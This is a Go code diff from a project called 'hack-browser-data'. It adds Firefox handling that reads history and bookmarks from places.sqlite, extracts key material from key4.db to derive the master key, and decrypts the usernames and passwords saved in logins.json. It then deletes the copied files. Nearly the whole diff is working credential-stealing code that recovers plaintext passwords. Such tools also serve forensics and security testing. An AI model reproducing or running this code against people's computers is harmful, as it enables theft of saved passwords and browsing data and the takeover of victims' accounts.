@@ -12,6 +12,7 @@ import (
 	"encoding/hex"
 	"hack-browser-data/log"
 	"hack-browser-data/utils"
+	"io"
 	"io/ioutil"
 	"os"
 	"sort"
@@ -93,6 +94,10 @@ func ParseResult(dbname string) {
 		parseLogin()
 	case utils.FirefoxCookie:
 		parseFirefoxCookie()
+	case utils.FirefoxKey4DB:
+		parseFirefoxKey4()
+	case utils.FirefoxData:
+		parseFirefoxData()
 	}
 }
 
@@ -299,20 +304,104 @@ func getBookmarkChildren(value gjson.Result) (children gjson.Result) {
 	return children
 }
 
-var queryPassword = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
+var queryFirefoxBookMarks = `SELECT id, fk, type, dateAdded, title FROM moz_bookmarks`
+var queryFirefoxHistory = `SELECT id, url, title, last_visit_date, visit_count FROM moz_places`
 
-func checkKey(key4 string) (b [][]byte) {
-	keyDB, err := sql.Open("sqlite3", key4)
+// places.sqlite doc @https://developer.mozilla.org/en-US/docs/Mozilla/Tech/Places/Database
+func parseFirefoxData() {
+	var historyList HistorySlice
+	var (
+		err                      error
+		keyDB                    *sql.DB
+		bookmarkRows, historyRow *sql.Rows
+		tempMap                  map[int64]string
+		bookmarkUrl              string
+	)
+	tempMap = make(map[int64]string)
+	keyDB, err = sql.Open("sqlite3", utils.FirefoxData)
+	defer os.Remove(utils.FirefoxData)
 	defer func() {
-		if err := keyDB.Close(); err != nil {
-			log.Println(err)
+		err := keyDB.Close()
+		if err != nil {
+			log.Error(err)
 		}
 	}()
+	if err != nil {
+		log.Error(err)
+	}
+	bookmarkRows, err = keyDB.Query(queryFirefoxBookMarks)
+	historyRow, err = keyDB.Query(queryFirefoxHistory)
+	if err != nil {
+		log.Error(err)
+	}
+	defer func() {
+		if err := bookmarkRows.Close(); err != nil {
+			log.Error(err)
+		}
+	}()
+	defer func() {
+		if err := historyRow.Close(); err != nil {
+			log.Error(err)
+		}
+	}()
+	for historyRow.Next() {
+		var (
+			id, visitDate int64
+			url, title    string
+			visitCount    int
+		)
+		err = historyRow.Scan(&id, &url, &title, &visitDate, &visitCount)
+		historyList = append(historyList, history{
+			Title:         title,
+			Url:           url,
+			VisitCount:    visitCount,
+			LastVisitTime: utils.TimeStampFormat(visitDate / 100000),
+		})
+		tempMap[id] = url
+	}
+	FullData.HistorySlice = historyList
+
+	for bookmarkRows.Next() {
+		var (
+			id, fk, bType, dateAdded int64
+			title                    string
+		)
+		err = bookmarkRows.Scan(&id, &fk, &bType, &dateAdded, &title)
+		if url, ok := tempMap[id]; ok {
+			bookmarkUrl = url
+		}
+		bookmarkList = append(bookmarkList, bookmarks{
+			ID:        id,
+			Name:      title,
+			Type:      utils.BookMarkType(bType),
+			URL:       bookmarkUrl,
+			DateAdded: utils.TimeStampFormat(dateAdded / 1000000),
+		})
+	}
+	FullData.BookmarkSlice = bookmarkList
+}
+
+var queryPassword = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
+
+func checkKey1() (b [][]byte) {
+	var (
+		err   error
+		keyDB *sql.DB
+		rows  *sql.Rows
+	)
+
+	keyDB, err = sql.Open("sqlite3", utils.FirefoxKey4DB)
+	defer func() {
+		if err := keyDB.Close(); err != nil {
+			log.Error(err)
+		}
+	}()
+
 	if err != nil {
 		log.Println(err)
 	}
 	err = keyDB.Ping()
-	rows, err := keyDB.Query(queryPassword)
+	rows, err = keyDB.Query(queryPassword)
 	defer func() {
 		if err := rows.Close(); err != nil {
 			log.Println(err)
@@ -323,26 +412,34 @@ func checkKey(key4 string) (b [][]byte) {
 			item1, item2 []byte
 		)
 		if err := rows.Scan(&item1, &item2); err != nil {
-			log.Println(err)
+			log.Error(err)
+			continue
 		}
 		b = append(b, item1, item2)
 	}
 	return b
 }
 
-var queryDecode = `SELECT a11, a102 from nssPrivate;`
+var queryNssPrivate = `SELECT a11, a102 from nssPrivate;`
 
-func checkA102(key4 string) (b [][]byte) {
-	keyDB, err := sql.Open("sqlite3", key4)
+func checkA102() (b [][]byte) {
+	keyDB, err := sql.Open("sqlite3", utils.FirefoxKey4DB)
+
 	defer func() {
-		if err := keyDB.Close(); err != nil {
-			log.Println(err)
+		if err := os.Remove(utils.FirefoxKey4DB); err != nil {
+			log.Error(err)
 		}
 	}()
+	defer func(closer io.Closer) {
+		if err := keyDB.Close(); err != nil {
+			log.Error(err)
+		}
+	}(keyDB)
+
 	if err != nil {
-		log.Println(err)
+		log.Error(err)
 	}
-	rows, err := keyDB.Query(queryDecode)
+	rows, err := keyDB.Query(queryNssPrivate)
 	defer func() {
 		if err := rows.Close(); err != nil {
 			log.Println(err)
@@ -357,7 +454,6 @@ func checkA102(key4 string) (b [][]byte) {
 		}
 		b = append(b, a11, a102)
 	}
-	log.Println(b)
 	return b
 }
 
@@ -414,8 +510,8 @@ func decryptPBE(decodeItem []byte) (pbe PBEAlgorithms) {
 	return
 }
 
-func DecodeKey4() {
-	h1 := checkKey("key4.db")
+func parseFirefoxKey4() {
+	h1 := checkKey1()
 	globalSalt := h1[0]
 	decodedItem := h1[1]
 	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
@@ -424,7 +520,7 @@ func DecodeKey4() {
 	var finallyKey []byte
 	if bytes.Contains(m, []byte("password-check")) {
 		log.Println("password-check success")
-		h2 := checkA102("key4.db")
+		h2 := checkA102()
 		a11 := h2[0]
 		a102 := h2[1]
 		m := bytes.Compare(a102, keyLin)
@@ -435,7 +531,7 @@ func DecodeKey4() {
 			log.Debugf("finally key", finallyKey, hex.EncodeToString(finallyKey))
 		}
 	}
-	allLogins := GetLoginData("logins.json")
+	allLogins := GetLoginData()
 	for _, v := range allLogins {
 		log.Warn(hex.EncodeToString(v.encryptUser))
 		s1 := decryptLogin(v.encryptUser)
@@ -452,15 +548,17 @@ func DecodeKey4() {
 		blockMode2 := cipher.NewCBCDecrypter(block, s2.Iv)
 		sq2 := make([]byte, len(s2.Encrypted))
 		blockMode2.CryptBlocks(sq2, s2.Encrypted)
-		u := utils.PKCS7UnPadding(sq)
-		s := utils.PKCS7UnPadding(sq2)
 		FullData.LoginDataSlice = append(FullData.LoginDataSlice, loginData{
 			LoginUrl:   v.LoginUrl,
-			UserName:   string(u),
-			Password:   string(s),
+			UserName:   string(utils.PKCS7UnPadding(sq)),
+			Password:   string(utils.PKCS7UnPadding(sq2)),
 			CreateDate: v.CreateDate,
 		})
 	}
+	//err := os.Remove("key4.db")
+	//if err != nil {
+	//	fmt.Println(err)
+	//}
 }
 
 var queryFirefoxCookie = `SELECT name, value, host, path, creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies`
@@ -571,12 +669,12 @@ func paddingZero(s []byte, l int) []byte {
 	}
 }
 
-func GetLoginData(loginsJson string) (l []loginData) {
-	s, err := ioutil.ReadFile(loginsJson)
+func GetLoginData() (l []loginData) {
+	s, err := ioutil.ReadFile(utils.FirefoxLoginData)
 	if err != nil {
 		log.Warn(err)
 	}
-	defer os.Remove(loginsJson)
+	defer os.Remove(utils.FirefoxLoginData)
 	h := gjson.GetBytes(s, "logins")
 	if h.Exists() {
 		for _, v := range h.Array() {
